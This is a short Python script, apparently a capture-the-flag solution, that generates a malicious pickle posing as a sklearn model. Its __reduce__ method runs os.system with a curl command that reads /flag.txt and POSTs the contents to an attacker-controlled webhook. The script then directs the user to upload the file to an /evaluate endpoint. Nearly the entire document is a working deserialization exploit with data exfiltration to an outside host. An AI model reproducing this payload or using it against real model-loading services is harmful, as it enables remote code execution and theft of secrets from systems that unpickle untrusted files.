"""
gen_payload.py – Generates a malicious .pkl that exfiltrates /flag.txt
via an HTTP POST to a webhook URL you control.

Usage:
    python3 gen_payload.py <WEBHOOK_URL>

Example:
    python3 gen_payload.py https://webhook.site/your-uuid-here

Then upload the produced `evil_model.pkl` to the challenge.
"""

import pickle
import os
import sys


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    webhook = sys.argv[1].strip()

    # The payload:  read /flag.txt and POST its content to the webhook.
    # We use `curl` because it's almost always present in the container.
    command = (
        f"curl -s -X POST '{webhook}' "
        f"--data-urlencode \"flag=$(cat /flag.txt)\" "
        f"-H 'Content-Type: application/x-www-form-urlencoded'"
    )

    class Exploit:
        """A fake sklearn model whose __reduce__ runs arbitrary code."""

        def __reduce__(self):
            return (os.system, (command,))

    payload = Exploit()

    with open("evil_model.pkl", "wb") as f:
        pickle.dump(payload, f)

    print(f"[+] Payload written to evil_model.pkl")
    print(f"[+] Command embedded: {command}")
    print("[*] Upload evil_model.pkl to the /evaluate endpoint.")
    print(f"[*] Watch your webhook at: {webhook}")


if __name__ == "__main__":
    main()
